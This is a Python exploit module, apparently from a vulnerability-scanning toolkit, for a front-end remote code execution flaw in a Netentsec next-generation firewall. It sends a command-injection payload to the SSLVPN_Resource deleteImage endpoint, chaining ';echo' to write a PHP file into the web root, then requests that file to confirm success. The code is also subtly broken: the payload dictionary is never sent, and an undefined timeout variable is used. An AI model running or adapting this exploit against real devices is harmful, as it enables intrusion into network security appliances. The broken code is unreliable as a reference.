#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re,time
import random,string
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '网康科技-下一代防火墙前台 RCE(2022HVV)',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
  randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
  shell = f'<?php echo "{randstr1}"."{randstr2}"; ?>'
  filename = 'test.php'
  ret = msg()

  headers = {
      'User-Agent': ua,
      'Cookie': 'PHPSESSID=e3ctlj1s8b5oblktckrk4anjh7; ys-active_page=s%3A',
      }
  payload_json = {
      "action": "SSLVPN_Resource",
      "method": "deleteImage",
      "data": [{
          "data": [f"/var/www/html/b.txt;echo '{shell}'>/var/www/html/{filename}"]
      }],
      "type": "rpc",
      "tid": '17',
    }
  target = '/directdata/direct/router'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search('SSLVPN_Resource', res.text):
      res.close()
    else:
      return ret
  except:
    return ret
  try:
    rep2 = requests.get(url+'/'+filename, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
    if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
      rep2.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret